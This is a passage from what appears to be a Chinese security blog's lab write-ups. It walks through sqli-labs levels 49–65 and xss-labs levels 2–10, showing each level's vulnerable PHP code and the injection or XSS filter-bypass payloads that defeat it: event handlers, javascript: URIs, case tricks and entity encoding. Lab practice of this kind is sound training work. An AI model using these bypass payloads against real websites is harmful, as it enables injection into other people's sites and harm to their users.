src="/2023/02/09/SQLI/image-20230816003708096.png"></p><h3 id="level49"><a href="#level49" class="headerlink" title="level49"></a>level49</h3><p>引号闭合，但是无报错信息，延时注入</p><h3 id="level50"><a href="#level50" class="headerlink" title="level50"></a>level50</h3><p>可报错注入也可堆叠注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br>       ......<br>   <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level51"><a href="#level51" class="headerlink" title="level51"></a>level51</h3><p>比起上一题多了单引号闭合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>)) <br>       ......<br>   <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$con1</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="level52"><a href="#level52" class="headerlink" title="level52"></a>level52</h3><p>没有报错，只能堆叠或者延时：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><h3 id="level53"><a href="#level53" class="headerlink" title="level53"></a>level53</h3><p>依旧没有报错，比起上一题多了单引号闭合：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>;<br><span class="hljs-comment">/* execute multi query */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$con1</span>, <span class="hljs-variable">$sql</span>))<br></code></pre></td></tr></table></figure><h3 id="level54"><a href="#level54" class="headerlink" title="level54"></a>level54</h3><p>被限定了次数，十次以内要获得secret_key</p><p><img src="/2023/02/09/SQLI/image-20230816013349810.png"></p><p>爆表名：</p><p><img src="/2023/02/09/SQLI/image-20230816013546447.png"></p><p>字段名：</p><p><img src="/2023/02/09/SQLI/image-20230816013657232.png"></p><p>那么我们目标的应该就是secret_P551字段中的东西了，爆数据：</p><p><img src="/2023/02/09/SQLI/image-20230816013833474.png"></p><h3 id="level55"><a href="#level55" class="headerlink" title="level55"></a>level55</h3><p>有14次机会</p><p><img src="/2023/02/09/SQLI/image-20230816185347159.png"></p><p>括号闭合整数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM security.users WHERE id=(<span class="hljs-subst">$id</span>) LIMIT 0,1&quot;</span>;<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><h3 id="level56"><a href="#level56" class="headerlink" title="level56"></a>level56</h3><p>单引号+括号闭合：</p><p><img src="/2023/02/09/SQLI/image-20230816185906878.png"></p><h3 id="level57"><a href="#level57" class="headerlink" title="level57"></a>level57</h3><p>双引号闭合</p><p><img src="/2023/02/09/SQLI/image-20230816190011961.png"></p><h3 id="level58"><a href="#level58" class="headerlink" title="level58"></a>level58</h3><p>使用单引号闭合报错注入</p><p><img src="/2023/02/09/SQLI/image-20230816193015731.png"></p><h3 id="level59"><a href="#level59" class="headerlink" title="level59"></a>level59</h3><p>整数闭合，报错注入：</p><p><img src="/2023/02/09/SQLI/image-20230816193218467.png"></p><h3 id="level60"><a href="#level60" class="headerlink" title="level60"></a>level60</h3><p>双引号+括号报错注入：</p><p><img src="/2023/02/09/SQLI/image-20230816193816781.png"></p><h3 id="level61"><a href="#level61" class="headerlink" title="level61"></a>level61</h3><p>单引号+双括号闭合：</p><p><img src="/2023/02/09/SQLI/image-20230816194208635.png"></p><h3 id="level62"><a href="#level62" class="headerlink" title="level62"></a>level62</h3><p>单引号+括号闭合，无报错结果，可布尔可时间盲注</p><p><img src="/2023/02/09/SQLI/image-20230816194849144.png"></p><p><img src="/2023/02/09/SQLI/image-20230816195044179.png"></p><h3 id="level63"><a href="#level63" class="headerlink" title="level63"></a>level63</h3><p>单引号，无报错信息，布尔盲注or时间盲注：</p><p><img src="/2023/02/09/SQLI/image-20230816195219052.png"></p><p><img src="/2023/02/09/SQLI/image-20230816195232417.png"></p><h3 id="level64"><a href="#level64" class="headerlink" title="level64"></a>level64</h3><p>整数+双括号闭合，布尔or时间盲注</p><p><img src="/2023/02/09/SQLI/image-20230816195607490.png"></p><h3 id="level65"><a href="#level65" class="headerlink" title="level65"></a>level65</h3><p>双引号+括号闭合，布尔or时间盲注<img src="/2023/02/09/SQLI/image-20230816195718057.png"></p><p><img src="/2023/02/09/SQLI/image-20230816195806826.png"></p>]]></content>
    
    
    <categories>
      
      <category>常见漏洞</category>
      
      <category>Web漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>sqli</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS</title>
    <link href="/2023/02/09/XSS/"/>
    <url>/2023/02/09/XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="Xss-Labs"><a href="#Xss-Labs" class="headerlink" title="Xss_Labs"></a>Xss_Labs</h2><p><em><strong>涉及到XSS查看源代码的操作均使用ViewSource，不要用开发者工具的Elements查看！不会显示HTML实体的，浏览器会自动解码！</strong></em></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>传<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>如下：</p><p><img src="/2023/02/09/XSS/image-20230725015602870.png"></p><p>看一眼源代码，发现value属性中的字符没有变成HTML实体，而<code>&lt;h2&gt;</code>标签内的变了，说明在表单内的字符没有进行过滤，GET传入服务器时无过滤，但是服务器传回到浏览器发生转义，emmm，那就直接闭合input标签就好了</p><p><img src="/2023/02/09/XSS/image-20230725015906495.png"></p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>用个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>探探路，表单内的和h2标签的都被转义了，</p><p><img src="/2023/02/09/XSS/image-20230725020709524.png"></p><p>那我们就看看有哪些预定义字符是会被php转义成实体的(文章参考<a href="https://cloud.tencent.com/developer/article/1516371">这篇</a>)</p><table><thead><tr><th>解码结果</th><th>描述</th><th>实体名称</th></tr></thead><tbody><tr><td></td><td>空格</td><td>&amp;nbsp;</td></tr><tr><td>&lt;</td><td>小于号</td><td>&amp;lt</td></tr><tr><td>&gt;</td><td>大于号</td><td>&amp;gt</td></tr><tr><td>&amp;</td><td>和</td><td>&amp;amp</td></tr><tr><td>“</td><td>双引号</td><td>&amp;quot</td></tr></tbody></table><p>注意单引号虽然存在实体&amp;apos但是不被转义，HTML5中预留但是也不推荐使用</p><p>先闭合value，再引入鼠标事件的属性(onclick,onfocus,<a href="https://blog.csdn.net/qq_43269730/article/details/82883031?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164371459016780269856817%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164371459016780269856817&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-82883031.first_rank_v2_pc_rank_v29&utm_term=onmouseover&spm=1018.2226.3001.4187">onmouseover,onmouseout</a>等等)</p><p>构造payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-string">&#x27; onclick=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//点击input标签时</span><br><span class="hljs-string">&#x27; onfocus=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//聚焦input标签时</span><br><span class="hljs-string">&#x27; onmouseover=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//进入input标签时</span><br><span class="hljs-string">&#x27; onmouseout=javascript:alert(1) &#x27;</span> <span class="hljs-comment">//移出input标签时</span><br></code></pre></td></tr></table></figure><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>依旧传入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，打开网页源码发现value没被转义但是&lt;&gt;字符被过滤，但是h2标签内被转义</p><p><img src="/2023/02/09/XSS/image-20230725163650930.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>试下和上一题同样的操作，但是双引号闭合：</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot; onmouseout=javascript:alert(1) &quot;</span><br></code></pre></td></tr></table></figure><h3 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h3><p>依旧<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>开局，script变成scr_ipt，再试试鼠标事件，on变成o_n，试一下大写绕过，结果全被换成小写，</p><p><img src="/2023/02/09/XSS/image-20230725201920714.png"></p><p><img src="/2023/02/09/XSS/image-20230725202104878.png"></p><p>去看下后端代码，script和on被替换，并且strtolower()函数存在，全转成小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>尝试js伪协议：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;a href=<span class="hljs-attr">javascript</span>:<span class="hljs-regexp">/0/</span>,<span class="hljs-title function_">alert</span>(%22M%<span class="hljs-number">22</span>)&gt;M&lt;/a&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:/00/,alert(%22M%22)</span>&gt;</span>M<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:/000/,alert(%22M%22)</span>&gt;</span>M<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:/M/,alert(%22M%22)</span>&gt;</span>M<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;m&lt;/a&gt;</span><br></code></pre></td></tr></table></figure><p>点击这个链接：</p><p><img src="/2023/02/09/XSS/image-20230725203423521.png"></p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><p>前面踩坑过程都一样，直接上后端代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>与上一题不同的是，这题没有小写转换，大写绕过下</p><p>payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/Script&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><p>直接上后端代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>全转成小写再过滤，很明显双写绕过了</p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>后端代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level8.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>是把传入的字符串进行转小写之后进行一系列过滤操作，最后将字符写入a标签的href属性中，跳转链接</p><p>利用js伪协议，传<code>javascript:alert(1)</code>，但是script被过滤，上网搜了下，可以使用unicode编码</p><p><img src="/2023/02/09/XSS/image-20230725212908598.png"></p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><p>上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>下面多了个strpos()函数的验证，输入字符串必须包含’http:&#x2F;&#x2F;‘，emmm，可是你也妹说在哪写’http:&#x2F;&#x2F;‘，直接和第八题一样</p><p>编码’javascript’：<br><img src="/2023/02/09/XSS/image-20230725213747632.png"></p><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;http://&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>话不多说，上代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 